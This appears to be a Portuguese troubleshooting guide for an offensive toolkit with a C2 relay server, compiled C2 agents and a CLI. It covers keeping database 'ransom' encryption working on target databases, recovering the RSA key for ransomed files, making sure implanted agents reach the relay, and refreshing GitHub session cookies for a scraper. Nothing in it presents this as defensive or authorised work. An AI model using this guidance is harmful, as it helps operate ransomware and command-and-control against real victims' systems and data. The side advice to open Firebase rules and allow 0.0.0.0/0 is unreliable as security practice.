# Solucao de Problemas

Problemas comuns e suas solucoes, organizados por sintoma.

---

## 1. "Connection refused" na porta 4445

**Sintoma:** A CLI nao consegue conectar ao servidor WebSocket Python. A mensagem de erro menciona `ws://localhost:4445` ou `ECONNREFUSED`.

**Causa:** O servidor Python nao esta rodando ou nao esta escutando na porta esperada.

**Solucao:**

```bash
# Check if the process is running
docker ps | grep attackmenu-py-server

# If using Docker, start the server
docker compose up -d py-server

# If running locally, start manually
cd src-p && python main.py

# Check logs for startup errors
docker compose logs py-server
```

Se o servidor iniciar mas sair imediatamente, verifique se o `PYTHONPATH` esta definido como `src-p` e se todas as dependencias estao instaladas (`pip install -r src-p/requirements.txt`).

---

## 2. "Connection refused" na porta 4444

**Sintoma:** A CLI nao consegue conectar ao servidor Ruby de relay C2. A mensagem de erro menciona `ws://localhost:4444` ou `ECONNREFUSED`.

**Causa:** O servidor Ruby nao esta rodando, ou o Thin falhou ao iniciar.

**Solucao:**

```bash
# Check if the process is running
docker ps | grep attackmenu-rb-server

# If using Docker, start the server
docker compose up -d rb-server

# If running locally
cd src-rb && bundle exec thin start -R config.ru -p 4444

# Check logs
docker compose logs rb-server
```

---

## 3. CLI trava apos selecionar operacao de banco de dados

**Sintoma:** A CLI envia um comando ao servidor Python e congela. Nenhuma resposta aparece em mais de 10 segundos.

**Causa:** O servidor WS Python recebeu o comando mas esta travado durante a execucao. Isso pode acontecer se o banco de dados alvo estiver inacessivel ou a conexao expirar.

**Solucao:**

```bash
# Check Python server logs in real time
docker compose logs -f py-server

# Verify the server is still responding
python -c "import socket; s=socket.create_connection(('localhost',4445),2); s.close(); print('OK')"
```

Se o servidor estiver ativo mas nao respondendo ao comando especifico, o banco de dados alvo pode estar fora do ar ou a URI pode ser invalida. O servidor Python tem um timeout padrao de 10 segundos para conexoes com banco de dados.

---

## 4. "KEY_CRIP_DATA not set"

**Sintoma:** O servidor Python recusa realizar operacoes de criptografia/descriptografia. O log de erro diz que `KEY_CRIP_DATA` esta ausente ou vazia.

**Causa:** A variavel de ambiente `KEY_CRIP_DATA` nao esta definida ou esta vazia.

**Solucao:**

```bash
# Set in .env file
echo 'KEY_CRIP_DATA=your-secret-key-here' >> .env

# Or export directly (for local dev only)
export KEY_CRIP_DATA="your-secret-key-here"

# In Docker, the variable is read from .env automatically
# Verify it is set inside the container
docker exec attackmenu-py-server env | grep KEY_CRIP_DATA
```

Essa variavel e obrigatoria para todas as operacoes de ransom em banco de dados (criptografar/descriptografar). Sem ela, o servidor iniciara mas os comandos de banco falharam.

---

## 5. Falha no build do Docker

**Sintoma:** `docker compose build` falha com varios erros.

**Causa:** Multiplas causas possiveis.

**Solucao:**

```bash
# Check Docker daemon is running
docker info

# Check available disk space (Docker needs several GB for images)
df -h /var/lib/docker

# Clean up old images and build cache
docker system prune -f
docker builder prune -f

# Rebuild without cache if a previous build left corrupted layers
docker compose build --no-cache
```

Se um servico especifico falhar no build, verifique seu Dockerfile:
- `py-server`: Precisa de acesso a internet para `pip install` do PyPI.
- `rb-server`: Precisa de acesso a internet para `bundle install` do RubyGems.
- `compiler`: Precisa de pacotes Debian (gcc, mingw, libssl-dev).
- `cli`: Precisa de acesso a internet para `npm ci` do registro npm.

---

## 6. MySQL "Data too long for column"

**Sintoma:** A insercao de dados criptografados no MySQL falha porque o texto cifrado excede o tamanho da coluna (VARCHAR).

**Causa:** O texto cifrado AES-256-GCM com codificacao base64 e significativamente maior que o texto original. Uma coluna VARCHAR(255) nao consegue armazenar a saida criptografada.

**Solucao:**

O `BaseSqlAdapter` do Python automaticamente executa `ALTER TABLE ... MODIFY COLUMN ... TEXT` quando detecta esse erro. Se o ALTER automatico falhar (permissoes, modo somente leitura), altere a coluna manualmente:

```sql
ALTER TABLE target_table MODIFY COLUMN target_column TEXT;
```

Alternativamente, garanta que o usuario MySQL alvo tenha privilegios de ALTER no banco de dados alvo.

---

## 7. Supabase "project paused"

**Sintoma:** Chamadas a API do Supabase retornam 503 ou erros de "project is paused".

**Causa:** Projetos no plano gratuito do Supabase sao automaticamente pausados apos 7 dias de inatividade.

**Solucao:**

1. Acesse o painel do Supabase: https://supabase.com/dashboard
2. Selecione o projeto pausado.
3. Clique em "Restore project" e aguarde ele voltar a ficar online (1-2 minutos).
4. Tente novamente a operacao pela CLI.

Nao ha forma programatica de despausar um projeto. A restauracao deve ser feita pelo painel.

---

## 8. MongoDB "ServerSelectionTimeoutError"

**Sintoma:** Operacoes no MongoDB falham com `ServerSelectionTimeoutError` apos 30 segundos.

**Causa:** A URI do MongoDB esta errada, o cluster esta fora do ar, ou o IP nao esta na lista de permitidos.

**Solucao:**

```bash
# Test the connection string directly
mongosh "mongodb://user:pass@host:port/db?authSource=admin" --eval "db.runCommand({ping:1})"
```

Correcoes comuns:
- **Lista de IPs permitidos do Atlas:** Acesse o painel do Atlas > Network Access > Adicione seu IP atual (ou 0.0.0.0/0 para testes).
- **Formato de URI errado:** Garanta que a URI comeca com `mongodb://` ou `mongodb+srv://` e inclui `?authSource=admin` se estiver usando autenticacao.
- **Cluster pausado:** Clusters no plano gratuito do Atlas tambem podem pausar apos inatividade. Verifique o painel do Atlas.
- **Firewall:** Garanta que conexoes de saida para a porta 27017 (ou a porta do Atlas) estao permitidas.

Para o ambiente de teste Docker, o container test-mongo esta disponivel em `localhost:17017`.

---

## 9. GitHub scraper "cookie invalid"

**Sintoma:** O scraper do GitHub retorna resultados vazios ou erros 403. Os logs mencionam cookies invalidos ou expirados.

**Causa:** Os cookies de sessao do GitHub (`COOKIE_GIT0`, `COOKIE_GIT1`, `COOKIE_GIT2`) expiraram. Cookies de sessao do GitHub tipicamente expiram apos alguns dias a semanas.

**Solucao:**

1. Abra um navegador e faca login em cada conta do GitHub.
2. Abra o DevTools (F12) > Application > Cookies > `github.com`.
3. Copie a string completa do cookie (ou os valores de `user_session` e `__Host-user_session_same_site`).
4. Atualize os valores no `.env`:

```
COOKIE_GIT0=user_session=XXXX; __Host-user_session_same_site=XXXX; ...
COOKIE_GIT1=...
COOKIE_GIT2=...
```

5. Reinicie a CLI para carregar os novos valores.

Todos os 6 slots de cookie sao opcionais. O scraper usa os que estiverem disponiveis e ignora os vazios.

---

## 10. Agente C2 nao conecta ao servidor de relay

**Sintoma:** Um agente C2 compilado roda no alvo mas nao aparece na lista de maquinas do servidor Ruby de relay.

**Causa:** O arquivo `vault.h` embutido no agente no momento da compilacao tem o host/porta errados do servidor, ou um firewall esta bloqueando a conexao.

**Solucao:**

1. Verifique o `vault.h` usado durante a compilacao:

```c
// compiler/c2/vault.h
#define SERVER_HOST "your-server-ip-or-domain"
#define SERVER_PORT 4444
#define SERVER_PATH "/"
```

2. Garanta que o servidor Ruby de relay e acessivel a partir da rede do agente:
   - O relay deve estar escutando na porta 4444 (ou a `RB_WS_PORT` configurada).
   - Qualquer firewall entre o agente e o servidor deve permitir conexoes WebSocket de saida nessa porta.
   - Se estiver usando Docker, a porta deve estar publicada (`-p 4444:4444`).

3. Recompile o agente com o `vault.h` correto se o host/porta estiver errado.

---

## 11. Servidor Ruby sai imediatamente

**Sintoma:** O container do servidor Ruby inicia e sai em poucos segundos. `docker compose logs rb-server` mostra um erro de carregamento ou gem ausente.

**Causa:** Dependencias Ruby ausentes ou versoes de gems incompativeis.

**Solucao:**

```bash
# Locally
cd src-rb && bundle install

# In Docker, rebuild the image
docker compose build rb-server

# Check for specific gem errors in logs
docker compose logs rb-server 2>&1 | head -30
```

Gems necessarias (do Gemfile): thin, sinatra, faye-websocket, sorbet-runtime, dotenv, json, rack.

Se `bundle install` falhar em uma extensao nativa (como thin), garanta que `build-essential` esta instalado no sistema.

---

## 12. Erros de import do Python

**Sintoma:** Executar `python main.py` falha com `ModuleNotFoundError` para modulos do projeto como `infra.app.AppModule`.

**Causa:** O `PYTHONPATH` nao esta configurado corretamente, ou dependencias estao faltando.

**Solucao:**

```bash
# Set PYTHONPATH to include the src-p directory
export PYTHONPATH=src-p

# Install all dependencies
pip install -r src-p/requirements.txt

# Verify the module is importable
python -c "import sys; sys.path.insert(0, 'src-p'); from infra.app.AppModule import AppModule; print('OK')"
```

No Docker, `PYTHONPATH=/app/src-p` e definido no Dockerfile. Se estiver rodando localmente, defina antes de iniciar o servidor.

Pacotes necessarios: websockets (>=12.0), aiohttp (>=3.9), cryptography (>=42.0), pymysql (>=1.1), psycopg2-binary (>=2.9).

---

## 13. Erros de compilacao TypeScript

**Sintoma:** `npx tsc --noEmit` reporta erros de tipo.

**Causa:** Alteracoes no codigo introduziram incompatibilidades de tipo, imports ausentes ou violacoes de interface.

**Solucao:**

```bash
# Run the type checker and read the errors
npx tsc --noEmit

# Common issues:
# - A port interface changed but the adapter was not updated
# - A new Token<T> was added to TOKENS but the import type is missing
# - A use case constructor signature changed but DI registration was not updated
```

Verifique o arquivo e numero de linha especificos reportados. Padroes comuns:
- Se uma interface em `src/domain/ports/` mudou, atualize tanto o adapter em `src/infra/adapters/` quanto quaisquer mocks em `tests/mocks/`.
- Se uma nova dependencia foi adicionada ao construtor de um use case, atualize o registro em `src/application/DependencyInjection.ts`.

---

## 14. Testes falhando apos alteracoes

**Sintoma:** `npx vitest run` reporta falhas em testes que estavam passando anteriormente.

**Causa:** Mudancas de interface, novos parametros de construtor ou invariantes quebradas.

**Solucao:**

```bash
# Run the full test suite to see all failures
npx vitest run

# Run a specific test file for faster iteration
npx vitest run tests/unit/domain/EmailCredential.test.ts
```

Causas comuns:
- **Interface alterada (ex: `ISqlDialect`, `SqlRansomDTO`):** Atualize todas as implementacoes e mocks que implementam a interface.
- **Assinatura do construtor alterada:** Atualize as classes mock em `tests/mocks/` e os registros de DI.
- **Validacao do `criar()` da entidade alterada:** Atualize os dados de teste para corresponder as novas regras de validacao.
- **Novo campo obrigatorio adicionado:** Atualize todas as fixtures de teste para incluir o novo campo.

Sempre execute tanto `npx tsc --noEmit` quanto `npx vitest run` antes de commitar.

---

## 15. Erro MISCONF do Redis

**Sintoma:** Operacoes no Redis falham com `MISCONF Redis is configured to save RDB snapshots, but it is currently unable to persist on disk`.

**Causa:** O Redis esta tentando realizar saves em segundo plano mas o disco esta cheio ou as permissoes estao erradas.

**Solucao:**

Para testes, inicie o Redis sem persistencia:

```bash
redis-server --save "" --appendonly no
```

O `docker-compose.test.yml` ja configura o test-redis dessa forma. Se estiver usando uma instancia Redis standalone, adicione essas flags ou defina no `redis.conf`:

```
save ""
appendonly no
```

Para Redis em producao, garanta que o diretorio de dados tenha espaco em disco suficiente e permissoes corretas.

---

## 16. Firebase "Permission denied"

**Sintoma:** Operacoes no Firebase Realtime Database falham com `Permission denied` ou `PERMISSION_DENIED`.

**Causa:** As regras de seguranca do Firebase Realtime Database estao rejeitando a requisicao, ou as credenciais da conta de servico sao invalidas.

**Solucao:**

1. **Verifique as regras do Realtime Database** no Firebase Console > Realtime Database > Rules. Para testes, as regras podem ser definidas como:

```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

2. **Verifique a conta de servico:** Se estiver usando um JSON de conta de servico, garanta que o caminho do arquivo esta correto e que a conta tem as permissoes necessarias.

3. **Verifique o ID do projeto:** Garanta que a URL do projeto Firebase corresponde ao projeto real.

---

## 17. Chave privada perdida

**Sintoma:** Nao e possivel descriptografar arquivos criptografados pelo ransom porque a chave privada RSA esta ausente.

**Causa:** O arquivo `.pem` foi deletado ou o diretorio `secrets/` foi perdido.

**Solucao:**

1. Verifique o diretorio `secrets/` em busca de arquivos `.pem`:

```bash
ls -la secrets/*.pem 2>/dev/null
```

2. Se existirem arquivos `.pem.enc` (chave criptografada), descriptografe-os com a chave mestra:

```bash
openssl enc -aes-256-cbc -d -in secrets/private_key.pem.enc -out secrets/private_key.pem -pass env:RANSOM_MASTER_KEY
```

Isso requer que a variavel de ambiente `RANSOM_MASTER_KEY` esteja definida corretamente.

3. Se nem o `.pem` nem o `.pem.enc` existir, e nao houver backup, a chave privada esta permanentemente perdida. Arquivos criptografados com a chave publica RSA-2048 correspondente nao podem ser descriptografados.

Prevencao: Sempre faca backup do diretorio `secrets/` em um local separado e seguro imediatamente apos a geracao das chaves.

---

## 18. Porta ja em uso

**Sintoma:** Um servico falha ao iniciar com `EADDRINUSE`, `Address already in use` ou erro similar.

**Causa:** Outro processo ja esta escutando na porta necessaria.

**Solucao:**

```bash
# Find what is using the port (example: port 4445)
lsof -i :4445
# or
ss -tlnp | grep 4445

# Kill the process if appropriate
kill <PID>

# Or change the port in .env
PY_MANAGEMENT_PORT=4446   # Use a different host port
```

Portas padrao e suas variaveis de configuracao:

| Porta | Variavel             | Servico        |
|-------|----------------------|----------------|
| 4444  | `RB_WS_PORT`        | Ruby WS        |
| 4445  | `PY_MANAGEMENT_PORT` | Python WS      |
| 1212  | `PY_PROXY_PORT`      | Python proxy   |
| 8080  | `RB_HTTP_PORT`       | Ruby HTTP      |

Se estiver rodando tanto Docker quanto servicos locais simultaneamente, conflitos de porta sao esperados. Pare um ou outro, ou remapeie as portas do Docker usando as variaveis de ambiente acima.
